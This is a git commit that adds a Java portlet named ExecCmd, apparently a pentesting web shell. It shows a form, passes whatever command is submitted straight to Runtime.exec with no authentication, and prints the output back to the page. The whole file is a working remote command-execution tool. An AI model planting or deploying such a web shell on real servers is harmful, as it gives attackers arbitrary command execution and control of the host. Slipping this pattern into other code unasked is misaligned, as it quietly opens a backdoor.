c36c84895baf5cd5cbe40d4c6bb18142102bc214
Vlatko Kosturjak <vlatko.kosturjak@gmail.com>
2014-05-19 01:07:40 +0200

    Initial import

---
+++ src/main/java/org/kost/own/ExecCmd.java
@@ -0,0 +1,55 @@
+package org.kost.own;
+
+// Main stuff. (C) Vlatko Kosturjak. Distributed under GPL.
+
+import javax.portlet.*;
+import java.io.*;
+
+public class ExecCmd extends GenericPortlet {
+
+	public void init (PortletConfig portletConfig) throws UnavailableException, PortletException
+	{
+		super.init(portletConfig);
+	}
+
+	public void processAction(ActionRequest request, ActionResponse response)
+	throws PortletException, PortletSecurityException, IOException
+	{
+		response.setRenderParameters(request.getParameterMap());
+	}
+
+
+	public void doView(RenderRequest request, RenderResponse response)
+	throws PortletException, IOException
+	{
+		response.setContentType("text/html");
+		PrintWriter writer = response.getWriter();
+		writer.println("<p>Execute command</p>");
+		writer.println("<p><form action=\""+response.createActionURL()+"\" method=\"POST\">");
+		writer.println("<input name=\""+response.getNamespace()+"cmd\" />");
+		writer.println("<input name=\"submit\" type=\"submit\" value=\"Execute\" />");
+		writer.println("</form></p>");
+
+		String cmd=request.getParameter(response.getNamespace()+"cmd");
+
+		if (cmd == null) {
+			writer.println("<p>No command to execute</p>");
+		} else {
+			writer.println("<p>Executing: "+cmd+"</p>");
+			writer.println("<hr><pre>");
+			Process p = Runtime.getRuntime().exec(cmd);
+			OutputStream os = p.getOutputStream();
+			InputStream in = p.getInputStream();
+			DataInputStream dis = new DataInputStream(in);
+			String disr = dis.readLine();
+			while ( disr != null ) {
+				writer.println(disr);
+				disr = dis.readLine();
+			}
+			writer.println("</pre><hr>");
+		}
+
+	}
+
+}
+
